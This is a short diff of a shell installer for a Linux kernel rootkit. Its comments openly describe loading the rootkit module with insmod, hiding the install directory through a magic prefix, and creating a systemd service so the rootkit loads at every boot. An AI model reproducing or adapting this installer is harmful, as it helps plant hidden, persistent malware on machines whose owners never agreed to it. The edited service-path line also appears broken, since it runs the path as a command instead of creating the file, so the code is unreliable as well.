@@ -7,7 +7,7 @@ hFile=$(ls *.h)
 if test -f "$koFile"; then
     
     # Load the rootkit's kernel module:
-    sudo insmod "$koFile"
+    insmod "$koFile"
 
     # Hide current directory via MAGIC_PREFIX:
     magicPrefix=$(awk '/MAGIC_PREFIX/{print $3}' "$hFile" | tr -d '"')
@@ -16,7 +16,8 @@ if test -f "$koFile"; then
     mv "$thisDirPath" '../'"$magicPrefix""$thisDir"
 
     # Load rootkit on boot:
-    loadServicePath=$(touch "/etc/systemd/system/""$magicPrefix""load.service")
+    loadServicePath=$("/etc/systemd/system/""$magicPrefix""load.service")
+    touch $loadServicePath
     echo "[Unit]" >> "$loadServicePath"
     echo "Description=Joe Mamma" >> "$loadServicePath"
     echo "After=multi-user.target" >> "$loadServicePath"
